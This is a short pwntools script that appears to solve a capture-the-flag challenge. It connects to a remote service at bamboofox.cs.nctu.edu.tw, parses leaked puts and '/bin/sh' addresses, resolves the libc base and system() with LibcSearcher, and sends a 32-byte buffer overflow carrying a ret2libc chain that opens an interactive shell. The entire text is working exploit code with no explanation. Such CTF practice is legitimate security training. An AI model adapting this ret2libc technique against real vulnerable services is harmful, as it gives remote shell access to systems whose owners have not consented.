
from pwn import *
from LibcSearcher import LibcSearcher

r = remote('bamboofox.cs.nctu.edu.tw', 11002)

r.readline()
ADDR_BINSH = int(r.readline().split()[-1], 16)
leak = int(r.readline().split()[-1], 16)

libc = LibcSearcher('puts',leak)
LIBC_BASE = leak-libc.dump('puts')
ADDR_SYSTEM = LIBC_BASE + libc.dump('system')

print()
log.info('puts address       :' + hex(leak))
log.info('Libc base address  :' + hex(LIBC_BASE))
log.info('System address     :' + hex(ADDR_SYSTEM))
log.info('/bin/sh address    :' + hex(ADDR_BINSH))
print()

p = flat([b'A' * 32, ADDR_SYSTEM, 0x0, ADDR_BINSH])

r.sendline(p)
r.interactive()
